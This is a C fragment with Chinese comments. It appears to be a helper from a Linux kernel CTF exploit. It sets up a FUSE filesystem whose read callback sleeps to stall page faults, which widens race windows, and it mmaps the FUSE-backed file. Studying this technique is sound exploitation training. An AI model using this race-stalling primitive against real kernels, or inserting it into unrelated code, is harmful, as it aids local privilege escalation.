/*
 * fuse: 主要是两个call_back
 */

#define DIR "tmp"
#define filename "pwn"

static int getattr_callback(const char *path, struct stat *stbuf) {
    puts("[t][+] getattr_callback");
    memset(stbuf, 0, sizeof(struct stat));
    if (strcmp(path, filename) == 0) {
        stbuf->st_mode = S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
        return 0;
    }
    return -1;
}

static int open_callback(const char *path, struct fuse_file_info *fi) {
    puts("[t][+] open_callback");
    return 0;
}

static int read_callback(const char *path, char *file_buf, size_t size, off_t offset, struct fuse_file_info *fi) {
    static int fault_cnt = 0;

    puts("read_callback");
    printf("\tpath: %s\n", path);
    printf("\tsize: 0x%lx\n", size);
    printf("\toffset: 0x%lx\n", offset);

    if (strcmp(path, "/pwn") == 0) {
      // do something，like pause.
      sleep(100);
    }
    return -1;
}

static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
};

static void *fuse_thread(void *arg) {
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;

    puts("[t][*] setting up FUSE");

    if (mkdir(DIR, 0777))   // 创建挂载文件夹，在本例：当前目录创建 tmp 
      die("mkdir");
    
    if (!(chan = fuse_mount(DIR, &args)))  // 挂载文件系统
      die("fuse_mount");

    // 文件系统的属性。
    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
        fuse_unmount(DIR, chan);
        die("fuse_new");
    }


    // fuse_main 可以通过指定 argv 来进行挂载目录的名称，也需要先创建
    // fuse_main(int argc, char **argv, fuse_operations *ops, void *data);
    //
    // fuse_new 需要和 fuse_mount 合作
    // fuse_new(struct fuse_chan *fc, struct fuse_args *args, const struct
    //              fuse_operations *ops, unused size_t size, void *userdata);

    puts("[t][*] set cpu affinity");
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        die("sched_setaffinity");

    fuse_set_signal_handlers(fuse_get_session(fuse));
    setup_done = 1;
    puts("[t][*] waiting for page fault");
    fuse_loop_mt(fuse);
    fuse_unmount(DIR, chan);
}

int pwn_fd = -1;

void *mmap_fuse_file(void) {
    if (pwn_fd != -1) {
        puts("[*] closing DIR/filename to reopen it");
        close(pwn_fd);
    }
    pwn_fd = open("/tmp/pwn", O_RDWR);
    if (pwn_fd == -1)
        die("/tmp/pwn");

    void *page;
    page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, pwn_fd, 0);
    if (page == MAP_FAILED)
        die("mmap");
    printf("[+] mmap /tmp/pwn at 0x%llx\n", (long long unsigned int)page);
    return page;
}
